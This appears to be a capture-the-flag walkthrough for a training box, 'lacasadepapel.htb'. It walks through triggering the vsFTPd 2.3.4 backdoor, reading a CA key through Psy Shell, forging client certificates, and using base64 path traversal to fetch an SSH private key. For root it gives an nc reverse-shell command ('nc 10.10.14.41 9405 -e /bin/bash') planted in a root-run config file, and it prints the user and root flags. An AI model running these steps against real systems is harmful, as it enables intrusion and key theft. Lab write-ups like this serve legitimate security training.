# Summary
- Takeaways: 
    - enumerate all potential directories (missed email in `oslo`'s home directory folder that allowed for client certificate creation through the website rather than through `openssl` command line)
    - try every password / key and username combination
    - check SUID / SGID bits on all files and directories
- User: backdoor exploit in vsFTPd leading to a root ca.key which allows the creation of client certificate to download files from the server, download path is vulnerable to directory traversal and permits the retrieval of a private key that can be used for SSH login
- Root: SGID bit set on a directory containing a file that contains a command which is run by root 

# Details
### User: 4dcbd172fc9c9ef2ff65c13448d9062d
- Nmap scan reveals port 21, 80, and 443 are open, with a vulnerable instance of vsFTPd 2.3.4 on port 21
- attempting to log into the FTP server with any username ending in `:)` and an empty password activates the backdoor and opens a service on port 6200 that exposes `Psy Shell v0.9.9 (PHP 7.2.10 — cli)`
- command execution is disabled, but typing `help` into the prompt reveals commands that can be run, one of which is `ls` which lists any variables
- a variable named `$tokyo` is in scope and can be printed with `show $tokyo`
- the variable contains a class definition that opens a file located at `/home/nairobi/ca.key`
- the file can be retrieved by directly calling `file_get_contents` with the pathname of the file
- the website hosted on port 443 states a client certificate is needed to continue, which can now be created with the `ca.key`
    - `openssl s_client -showcerts lacasadepapel.htb:443`, retrieve the website's certificate from the output of the command and then save it as `ca.crt`
    - `openssl genrsa -out client.key 2048`, generate a private key
    - `openssl req -new -key device.key -out device.csr`, generate the certificate signing request, making sure to enter `lacasadepapel.htb` for the `Common Name` field
    - `openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 3650`, create the signed certificate
    - `openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12`, convert the client certificate and key to PKCS12 format so that Firefox can import it
    - import into Firefox through `Preferences -> Privacy & Security -> View Certificates -> Your Certificates -> Import`
        - getting the website to recognize the certificate sometimes requires using private mode
- navigating to the website on port 443 now allows access and gives options to download files
- the directory available for file downloads is controlled by the `path` variable in the URL, `https://lacasadepapel.htb/?path=SEASON-1`
- replacing `SEASON-1` with `../` makes it possible to view the contents of `berlin`'s home directory, which contains an `.ssh` directory with keys inside
- attempting to download one of the files from within the `SEASON-1` path reveal that the request is structured as `https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp`, where the portion after `/file/` in the URL is the base64 encoded path and filename (`U0VBU09OLTEvMDEuYXZp => SEASON-1/01.avi`)
- `echo -n '/home/berlin/.ssh/id_rsa' | base64` can be used to generate the correct string (`L2hvbWUvYmVybGluLy5zc2gvaWRfcnNh`) to retrieve the SSH private key
    - be sure to use `-n` to exclude the trailing newline character otherwise the server will crash and the box will have to be restarted
- the private SSH key allows you to login as the `professor` user, even though it was found in `berlin`'s home directory
- the user flag can be retrieved using the base64 encoding method or once root access has been gained

#### Alternate routes:
- the main website being served has an OTP QR code generator and a signup field that when used tells you to check your email
- nothing is ever sent, but once gaining shell access through the vsFTPd backdoor, `/home/oslo/Maildir/.Sent/cur/` will contain the email that was sent with a URL for generating the client certificate directly through the website rather than using `openssl` commands
- additionally, the Psy Shell can be escaped using `Chankro` to bypass the  `disable_functions` protections and grant shell access as `dali` who can then interact directly with `berlin`'s server running on `localhost:8000`, making it possible to grab the SSH private key that way

### Root: 586979c48efbef5909a23750cc07f511
- `pspy64` reveals that `/usr/bin/node /home/professor/memcached.js` occasionally runs as the user `nobody`
- there is also a file in `professor`'s home directory named `memcached.ini` that includes the line `command = sudo -u nobody /usr/bin/node /home/professor/memcached.js`
- this file is not able to be edited, but the SGID bit is set on the entire home directory for `professor`, meaning the file can be renamed or moved
- removing the file and then replacing it with a version that includes the line `command = /usr/bin/nc 10.10.14.41 9405 -e /bin/bash` allows a reverse shell to be spawned as the root user

### References:
- https://github.com/In2econd/vsftpd-2.3.4-exploit
- https://www.sitepoint.com/interactive-php-debugging-psysh/
- https://terryoy.github.io/2015/02/create-ssl-ca-root-and-self-sign.html
- https://security.stackexchange.com/questions/163199/firefox-certificate-can-t-be-installed
- https://www.gogetssl.com/online-csr-generator/, used for generating the CSR that the website requests in the alternative method
- https://github.com/TarlogicSecurity/Chankro, used for escaping the Psy Shell in the other alternative method

